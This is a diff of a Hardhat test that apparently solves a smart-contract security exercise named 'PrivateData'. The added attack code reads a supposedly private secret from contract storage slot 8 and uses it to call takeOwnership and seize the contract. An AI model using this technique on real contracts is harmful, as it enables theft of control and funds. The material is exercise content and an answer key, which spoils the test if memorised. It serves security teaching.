@@ -1,7 +1,7 @@
 import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
 import { expect } from 'chai';
 import { Contract } from 'ethers';
-import { ethers } from 'hardhat';
+import { ethers, network } from 'hardhat';
 
 describe('PrivateData', () => {
   let target: Contract;
@@ -20,9 +20,11 @@ describe('PrivateData', () => {
   });
 
   it('attack', async () => {
-    /**
-     * YOUR CODE HERE
-     */
+    const storedSecretKey = await ethers.provider.getStorageAt(target.address, 8);
+
+    const tx = await target.takeOwnership(storedSecretKey);
+
+    await tx.wait();
 
     expect(await target.owner()).to.equal(attacker.address);
   });
